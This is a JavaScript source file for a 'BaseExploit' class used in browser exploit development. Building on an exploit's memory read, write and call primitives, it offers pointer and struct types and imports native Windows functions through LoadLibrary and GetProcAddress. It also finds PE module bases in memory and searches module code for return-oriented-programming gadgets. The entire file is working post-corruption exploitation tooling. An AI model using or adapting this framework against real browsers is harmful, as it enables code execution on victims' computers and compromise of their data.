import Integer from "integer";

/**
 * Constructs a base exploit that provides useful data types and utility functions.
 *
 * @class A base exploit class for browser exploit development.
 * @param {number} bitness The bitness of the target process.
 * @constructor
 */
function BaseExploit(bitness) {
    // in bytes
    var DEFAULT_ALIGNMENT = bitness / 8;
    var POINTER_SIZE = bitness / 8;

    var libraries = {};
    var strings = [];
    var exploit = this;

    function cString(s) {
        var u8 = new Uint8Array(s.length + 1);
        for (var i = 0; i < s.length; i++) {
            u8[i] = s.charCodeAt(i);
        }
        u8[i] = 0;
        strings.push(u8);
        return exploit.addressOfArrayBuffer(u8.buffer);
    }

    function wString(s) {
        var u16 = new Uint16Array(s.length + 1);
        for (var i = 0; i < s.length; i++) {
            u16[i] = s.charCodeAt(i);
        }
        u16[i] = 0;
        strings.push(u16);
        return exploit.addressOfArrayBuffer(u16.buffer);
    }

    function getProcAddress(library, procName) {
        var addr = exploit.call(toIntMax(exploit.GetProcAddress), toIntMax(library), toIntMax(cString(procName)));
        if (addr == 0) {
            throw 'missing import ' + procName;
        }
        return addr;
    }

    function loadLibrary(dllName) {
        if (exploit.LoadLibraryA !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryA), toIntMax(cString(dllName)));
        } else if (exploit.LoadLibraryW !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryW), toIntMax(wString(dllName)));
        } else if (exploit.LoadLibraryExA !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryExA), toIntMax(cString(dllName)), toIntMax(0), toIntMax(0));
        } else if (exploit.LoadLibraryExW !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryExW), toIntMax(wString(dllName)), toIntMax(0), toIntMax(0));
        } else {
            throw 'missing load library address';
        }
    }

    /**
     * Loads a DLL (if not loaded already) and finds the given export.
     * @instance
     * @memberof BaseExploit
     * @param {string} dllName The name of DLL to find the function from.
     * @param {string} funcName The name of function to import.
     * @param {Type} returnType The type of the function return.
     * @returns {function}
     */
    function importFunction(dllName, funcName, returnType) {
        returnType = returnType || null;
        if (libraries[dllName] === undefined) {
            libraries[dllName] = loadLibrary(dllName);
        }
        return new FunctionType(returnType).cast(getProcAddress(libraries[dllName], funcName));
    }

    var pointerProxyHandler = {
        get: function(target, property) {
            try {
                var idx = parseInt(property);
            } catch (e) {
                return target[property];
            }
            if (isNaN(idx)) {
                return target[property];
            } else {
                return target.add(idx).load();
            }
        },
        set: function(target, property, value) {
            try {
                var idx = parseInt(property);
            } catch (e) {
                target[property] = value;
            }
            if (isNaN(idx)) {
                target[property] = value;
            } else {
                target.add(idx).store(value);
            }
            return true;
        },
    };

    /**
     * Constructs a pointer to a certain type.
     *
     * @param {Type} base type
     * @param {Integer} address
     * @instance
     * @memberof BaseExploit
     * @class
     * @constructor
     */
    function Pointer(type, address) {
        this.type = type;
        this.address = address;
        return new Proxy(this, pointerProxyHandler);
    }
    Pointer.prototype = {};
    /**
     * Returns a new pointer with result of pointer arithmetic.
     *
     * @param {Integer|number} x addend
     * @returns {Pointer}
     */
    Pointer.prototype.add = function (x) {
        return new Pointer(this.type, this.address.add(toIntMax(x).mul(this.type.size)));
    };
    /**
     * Returns the value stored at the pointer address. Alternatively, array syntax is supported.
     *
     * @returns {Integer|Pointer}
     */
    Pointer.prototype.load = function () {
        return this.type.load(this.address);
    };
    /**
     * Stores the value at the pointer address. Alternatively, array syntax is supported.
     *
     * @param {Integer|Pointer} value
     */
    Pointer.prototype.store = function (x) {
        return this.type.store(this.address, x);
    };
    /**
     * Converts the Pointer to a hexadecimal string.
     *
     * @returns {string}
     */
    Pointer.prototype.toString = function () {
        return '&0x' + this.address.toString(16);
    };
    /**
     * Returns whether address is zero.
     *
     * @returns {boolean}
     */
    Pointer.prototype.isNull = function () {
        return this.address.eq(0);
    };

    /** Constructs a pointer to a C string. 
     *
     * @param {string} s A string to make into a C string.
     * @instance
     * @memberof BaseExploit
     * @augments Pointer
     * @class
     * @constructor
     */
    function CString(s) {
        return Pointer.call(this, Uint8, cString(s));
    }
    CString.prototype = Object.create(Pointer.prototype);
    CString.prototype.constructor = CString;

    /**
     * Constructs a pointer to a UTF-16 string.
     * @param {string} s A string to make into a UTF-16 string.
     * @instance
     * @memberof BaseExploit
     * @augments Pointer
     * @class
     * @constructor
     */
    function WString(s) {
        return Pointer.call(this, Uint16, wString(s));
    }
    WString.prototype = Object.create(Pointer.prototype);
    WString.prototype.constructor = WString;

    /**
     * Type base class. Internal.
     * @instance
     * @memberof BaseExploit
     * @class
     * @constructor
     */
    function Type() {
    }
    Type.prototype = {
        /**
         * Constructs a PointerType of this type.
         *
         * @returns {PointerType}
         */
        get Ptr () {
            if (!this._ptr) {
                this._ptr = new PointerType(this);
            }
            return this._ptr;
        }
    };
    Type.prototype.constructor = Type;

    /**
     * Constructs a pointer type.
     * @param {Type} base Base type
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function PointerType(base) {
        Type.call(this);
        this.baseType = base;
        this.alignment = POINTER_SIZE;
        this.size = POINTER_SIZE;
    }
    PointerType.prototype = Object.create(Type.prototype);
    PointerType.prototype.constructor = PointerType;
    /**
     * Create a pointer to the given address with our base type.
     *
     * @param {Integer|Pointer} x Memory address
     * @returns {Pointer}
     */
    PointerType.prototype.cast = function (x) {
        x = toIntMax(x);
        if (this.baseType instanceof ArrayType) {
            return new Pointer(this.baseType.baseType, new Integer(x.low, x.high, true, POINTER_SIZE * 8));
        } else if (this.baseType instanceof StructType) {
            return new StructPointer(this.baseType, new Integer(x.low, x.high, true, POINTER_SIZE * 8));
        } else {
            return new Pointer(this.baseType, new Integer(x.low, x.high, true, POINTER_SIZE * 8));
        }
    }
    PointerType.prototype.load = function (address) {
        return this.cast(exploit.read(address, POINTER_SIZE * 8));
    }
    PointerType.prototype.store = function (address, x) {
        return exploit.write(address, toIntMax(x), POINTER_SIZE * 8);
    }

    /**
     * Constructs a function pointer type.
     * @param {Type} returnType Type of return value
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function FunctionType(returnType) {
        Type.call(this);
        this.returnType = returnType;
    }
    FunctionType.prototype = Object.create(Type.prototype);
    FunctionType.prototype.constructor = FunctionType;
    /**
     * Create a function pointer with the given address. Can be called like a Javascript function.
     *
     * @param {Integer|Pointer} x Memory address
     * @returns {function}
     */
    FunctionType.prototype.cast = function (ptr) {
        var returnType = this.returnType || null;
        var f = function(...args) {
            var result = exploit.call(ptr, ...args);
            if (returnType) {
                result = returnType.cast(result);
            }
            return result;
        };
        f.address = ptr;
        f.toString = function() {
            return '&0x' + this.address.toString(16);
        };
        return f;
    }

    var structPointerProxyHandler = {
        get: function(target, property) {
            var offset = target.type.offsets[property];
            if (offset !== undefined) {
                var t = target.type.types[property];
                var p = new PointerType(t).cast(target.address.add(offset));
                if (t instanceof ArrayType || t instanceof StructType) {
                    return p;
                }
                return p.load();
            } else {
                try {
                    var idx = parseInt(property);
                } catch (e) {
                    return target[property];
                }
                if (isNaN(idx)) {
                    return target[property];
                } else {
                    return target.add(idx);
                }
            }
        },
        set: function(target, property, value) {
            var offset = target.type.offsets[property];
            if (offset !== undefined) {
                var t = target.type.types[property];
                if (t instanceof StructType) {
                    throw 'cannot set struct field';
                }
                var p = new PointerType(t).cast(target.address.add(offset));
                p.store(value);
            } else {
                try {
                    var idx = parseInt(property);
                } catch (e) {
                    target[property] = value;
                }
                if (isNaN(idx)) {
                    target[property] = value;
                } else {
                    throw 'cannot set struct via array syntax';
                }
            }
        },
    };
    /**
     * Constructs a pointer to a structure type. Internal.
     *
     * @param {Type} base type
     * @param {Integer} address
     * @instance
     * @memberof BaseExploit
     * @class
     * @constructor
     */
    function StructPointer(type, address) {
        this.type = type;
        this.address = address;
        return new Proxy(this, structPointerProxyHandler);
    }
    StructPointer.prototype = {};
    StructPointer.prototype.add = function (x) {
        return new StructPointer(this.type, this.address.add(toIntMax(x).mul(this.type.size)));
    };
    StructPointer.prototype.toString = function () {
        return '&0x' + this.address.toString(16);
    };
    /**
     * Constructs a structure type.
     * @param {Array} fields Description of structure's fields
     * @param {integer} [alignment] Override default alignment
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function StructType(fields, alignment) {
        Type.call(this);
        alignment = alignment || DEFAULT_ALIGNMENT;
        this.fields = fields;

        this.alignment = 0;
        this.offsets = {};
        this.types = {};
        var offset = 0;
        for (var i = 0; i < fields.length; i++) {
            var name = fields[i][0], type = fields[i][1];
            if (this.offsets[name] !== undefined) {
                throw 'duplicate field name';
            }
            var a = Math.min(alignment, type.alignment);
            this.alignment = Math.max(this.alignment, a);
            if (offset % a) {
                offset += a - (offset % a);
            }
            this.offsets[name] = offset;
            this.types[name] = type;
            offset += type.size;
        }
        if (offset == 0) {
            throw 'empty struct';
        }
        if (offset % this.alignment) {
            offset += this.alignment - (offset % this.alignment);
        }
        this.size = offset;
    }
    StructType.prototype = Object.create(Type.prototype);
    StructType.prototype.constructor = StructType;

    /**
     * Constructs an array type.
     * @param {Type} base Base type
     * @param {integer} length Number of array elements
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function ArrayType(base, length) {
        Type.call(this);
        this.baseType = base;
        this.length = length;
        this.alignment = this.baseType.alignment;
        this.size = this.length * this.baseType.size;
    }
    ArrayType.prototype = Object.create(Type.prototype);
    ArrayType.prototype.constructor = ArrayType;
    ArrayType.prototype.load = function (address) {
        var result = new Array(this.length);
        var size = this.baseType.size;
        for (var i = 0; i < this.length; i++) {
            result[i] = this.baseType.load(address);
            address = address.add(size);
        }
        return result;
    }
    ArrayType.prototype.store = function (address, x) {
        var size = this.baseType.size;
        for (var i = 0; i < x.length; i++) {
            this.baseType.store(address, x[i]);
            address = address.add(size);
        }
    }

    /**
     * Constructs an integer type. Internal. Use predefined Int and Uint type objects.
     * @param {integer} bits Bit size
     * @param {boolean} signed Whether signed or not
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function IntType(bits, signed) {
        Type.call(this);
        this.bits = bits;
        this.signed = signed;
        this.alignment = bits / 8;
        this.size = bits / 8;
    }
    IntType.prototype = Object.create(Type.prototype);
    IntType.prototype.constructor = IntType;
    IntType.prototype.cast = function (x) {
        x = toIntMax(x);
        return new Integer(x.low, x.high, !this.signed, this.bits);
    }
    IntType.prototype.load = function (address) {
        return this.cast(exploit.read(address, this.bits));
    }
    IntType.prototype.store = function (address, x) {
        return exploit.write(address, toIntMax(x), this.bits);
    }

    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int8 = new IntType(8, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int16 = new IntType(16, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int32 = new IntType(32, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int64 = new IntType(64, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint8 = new IntType(8, false);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint16 = new IntType(16, false);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint32 = new IntType(32, false);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint64 = new IntType(64, false);

    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int8Ptr = new PointerType(Int8);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int16Ptr = new PointerType(Int16);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int32Ptr = new PointerType(Int32);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int64Ptr = new PointerType(Int64);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint8Ptr = new PointerType(Uint8);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint16Ptr = new PointerType(Uint16);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint32Ptr = new PointerType(Uint32);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint64Ptr = new PointerType(Uint64);

    function toIntMax(x) {
        if ('object' !== typeof x) {
            return Integer.fromValue(x);
        } else if (x instanceof Pointer || x instanceof StructPointer) {
            return new Integer(x.address.low, x.address.high);
        } else if (x instanceof Integer) {
            return new Integer(x.low, x.high);
        } else {
            throw 'unhandled type';
        }
    }

    Object.assign(this, {
        importFunction,
        loadLibrary,
        Pointer,
        CString,
        WString,
        ArrayType,
        FunctionType,
        PointerType,
        StructType,
        Integer,
        Int8,
        Int16,
        Int32,
        Int64,
        Uint8,
        Uint16,
        Uint32,
        Uint64,
        Int8Ptr,
        Int16Ptr,
        Int32Ptr,
        Int64Ptr,
        Uint8Ptr,
        Uint16Ptr,
        Uint32Ptr,
        Uint64Ptr,
    });
}
BaseExploit.prototype = {};
/**
 * Find the beginning of a PE module given any address in the module.
 *
 * @param {Integer} address Any address in the PE module
 * @returns {Integer}
 */
BaseExploit.prototype.findModuleBase = function (address) {
    address.low &= 0xFFFF0000; // align to 64kb-boundary
    while (true) {
        var p = this.Uint8Ptr.cast(address);
        if (p[0] == 0x4D && p[1] == 0x5A) {
            var peOffset = this.Uint32Ptr.cast(p.add(0x3C))[0];
            if (peOffset < 0x1000 && p[peOffset] == 0x50 && p[peOffset.add(1)] == 0x45) {
                return address;
            }
        }
        address = address.sub(0x10000);
    }
}
/**
 * Find a set of bytes in a PE module.
 *
 * @param {Integer|Pointer} module Base address of PE module
 * @param {Array} bytes Bytes to locate
 * @returns {Integer}
 */
BaseExploit.prototype.findGadget = function (module, bytes) {
    var p = this.Uint8Ptr.cast(module);
    var peOffset = this.Uint32Ptr.cast(p.add(0x3C))[0];
    var imageSize = this.Uint32Ptr.cast(module.add(peOffset))[20];
    var bytesLength = bytes.length;
    var firstByte = bytes[0];
    for (var i = 0x1000; i < imageSize; i++) {
        if ((i % 4) == 0) {
            // Optimization: check for first byte within current 4 bytes
            var x = this.Uint32Ptr.cast(p.add(i))[0].low;
            if (((x >>> 0) & 0xFF) != firstByte &&
              ((x >>> 8) & 0xFF) != firstByte &&
              ((x >>> 16) & 0xFF) != firstByte &&
              ((x >>> 24) & 0xFF) != firstByte) {
                i += 3;
                continue;
            }
        }
        for (var j = 0; j < bytesLength; j++) {
            if (bytes[j] >= 0 && bytes[j] != p[i + j]) {
                break;
            }
        }
        if (j == bytesLength) {
            return p.add(i);
        }
        i += j;
    }
    return null;
}
/**
 * Find multiple sets of bytes in a PE module.
 *
 * @param {Integer|Pointer} module Base address of PE module
 * @param {Array} query Array of gadgets to find
 * @returns {object}
 */
BaseExploit.prototype.findGadgets = function (module, query) {
    var p = this.Uint8Ptr.cast(module);
    var peOffset = this.Uint32Ptr.cast(p.add(0x3C))[0];
    var codeSize = this.Uint32Ptr.cast(module.add(peOffset))[7];
    var array = new Int32Array(codeSize / 4);
    var address = p.address.add(0x1000);
    for (var i = 0x1000; i < codeSize; i += 8) {
        var x = this.read(address, 64);
        array[i / 4] = x.low;
        array[i / 4 + 1] = x.high;
        address.low += 8;
        if ((address.low|0) == 0) {
            address.high += 1;
        }
    }

    var byteArray = new Uint8Array(array.buffer);
    var gadgets = {};
    query.forEach((gadget) => {
        var name = gadget[0], bytes = gadget[1];
        var idx = 0;
        while (true) {
            idx = byteArray.indexOf(bytes[0], idx);
            if (idx < 0) {
                throw 'missing gadget ' + name;
            }
            for (var j = 1; j < bytes.length; j++) {
                if (bytes[j] >= 0 && byteArray[idx + j] != bytes[j]) {
                    break;
                }
            }
            if (j == bytes.length) {
                break;
            }
            idx++;
        }
        gadgets[name] = p.add(idx);
    });
    return gadgets;
}

export default BaseExploit;
